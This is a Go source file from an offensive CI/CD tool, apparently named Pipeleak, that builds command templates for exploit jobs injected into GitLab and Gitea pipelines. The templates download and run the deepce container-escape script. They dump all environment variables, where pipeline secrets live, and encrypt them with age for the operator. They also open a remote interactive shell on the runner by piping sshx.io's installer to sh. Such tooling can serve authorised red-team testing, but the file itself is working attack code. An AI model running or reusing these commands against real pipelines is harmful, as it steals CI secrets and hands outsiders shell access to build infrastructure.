package template

// ExploitScript returns the common exploit script commands used by both GitLab and Gitea
func ExploitScript() []string {
	return []string{
		"echo \"Pipeleak exploit job\"",
		"id",
		"whoami",
		"curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh",
		"chmod +x deepce.sh",
		"./deepce.sh",
	}
}

// GetAgeEncryptionCommands returns commands to encrypt environment variables with Age
func GetAgeEncryptionCommands(agePublicKey string) []string {
	if len(agePublicKey) == 0 {
		return []string{}
	}

	return []string{
		"curl -s https://api.github.com/repos/FiloSottile/age/releases/latest | \\\n grep download/.*linux-amd64.tar.gz | \\\n cut -d : -f 2,3 | \\\n xargs curl -O -L",
		"tar -xzvf *linux-amd64.tar.gz",
		"env |\\\n ./age/age -a -r " + agePublicKey,
	}
}

// GetShellCommand returns the command to start an SSHX interactive shell
func GetShellCommand() string {
	return "curl -sSf https://sshx.io/get | sh -s run"
}

// BeforeScriptCommands returns common setup commands for Ubuntu-based runners
func BeforeScriptCommands() []string {
	return []string{
		"apt update && apt install curl libcap2-bin -y",
		"curl -fsSL https://get.docker.com -o get-docker.sh",
		"sh ./get-docker.sh",
	}
}
